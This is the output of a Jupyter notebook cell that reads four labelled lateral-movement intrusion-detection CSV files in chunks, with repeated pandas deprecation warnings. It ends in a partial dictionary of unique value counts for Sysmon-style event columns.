{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing File 1/4: F:/Intrusion detection datasets/Lateral-Movement-Dataset--LMD_Collections/LMD_essential\\LMD-2022 [870K Elements][Labelled].csv\n",
      "  Reading Chunk 1...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 2...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 3...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 4...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 5...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 6...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 7...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 8...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 9...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing File 2/4: F:/Intrusion detection datasets/Lateral-Movement-Dataset--LMD_Collections/LMD_essential\\LMD-2023 [1.75M Elements][Labelled]checked.csv\n",
      "  Reading Chunk 1...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 2...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 3...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 4...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 5...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 6...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 7...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 8...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 9...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 10...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 11...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 12...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 13...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 14...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 15...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 16...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 17...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 18...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing File 3/4: F:/Intrusion detection datasets/Lateral-Movement-Dataset--LMD_Collections/LMD_essential\\LMD-2023 [1.87M Elements][Labelled]checked.csv\n",
      "  Reading Chunk 1...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 2...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 3...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 4...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 5...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 6...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 7...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 8...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 9...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 10...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 11...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 12...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 13...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 14...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 15...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 16...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 17...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 18...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 19...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 20...\n",
      "Processing File 4/4: F:/Intrusion detection datasets/Lateral-Movement-Dataset--LMD_Collections/LMD_essential\\LMD-2023 [2.3M Elements][Labelled]checked.csv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 1...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 2...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 3...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 4...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 5...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 6...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 7...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 8...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 9...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 10...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 11...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 12...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 13...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 14...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 15...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 16...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 17...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 18...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 19...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 20...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 21...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 22...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\142745622.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unique Counts: {'Name': 1, 'Guid': 2, 'EventID': 38, 'Version': 10, 'Level': 4, 'Task': 38, 'Opcode': 2, 'Keywords': 1, 'SystemTime': 5814345, 'EventRecordID': 120469, 'Correlation': 2, 'Execution_ProcessID': 27, 'ProcessID': 122, 'ThreadID': 339, 'Channel': 1, 'Computer': 8, 'UserID': 4, 'RuleName': 46, 'UtcTime': 22301, 'ProcessGuid': 15455, 'ProcessId': 2372, 'Image': 515, 'FileVersion': 230, 'Description': 439, 'Product': 61, 'Company': 19, 'OriginalFileName': 475, 'CommandLine': 2947, 'CurrentDirectory': 81, 'User': 17, 'LogonGuid': 357, 'LogonId': 184, 'TerminalSessionId': 7, 'IntegrityLevel': 7, 'Hashes': 5025, 'ParentProcessGuid': 1706, 'ParentProcessId': 1065, 'ParentImage': 190, 'ParentCommandLine': 436, 'ParentUser': 11, 'Protocol': 4, 'Initiated': 4, 'SourceIsIpv6': 4, 'SourceIp': 74, 'SourceHostname': 20, 'SourcePort': 3286, 'SourcePortName': 12, 'DestinationIsIpv6': 4, 'DestinationIp': 676, 'DestinationHostname': 69, 'DestinationPort': 2612, 'DestinationPortName': 22, 'State': 3, 'Version2': 4, 'SchemaVersion': 5, 'Configuration': 7, 'ConfigurationFileHash': 6, 'ImageLoaded': 299, 'Signed': 5, 'Signature': 9, 'SignatureStatus': 5, 'SourceProcessGUID': 376, 'SourceProcessId': 344, 'SourceThreadId': 470, 'SourceImage': 46, 'TargetProcessGUID': 783, 'TargetProcessId': 774, 'TargetImage': 117, 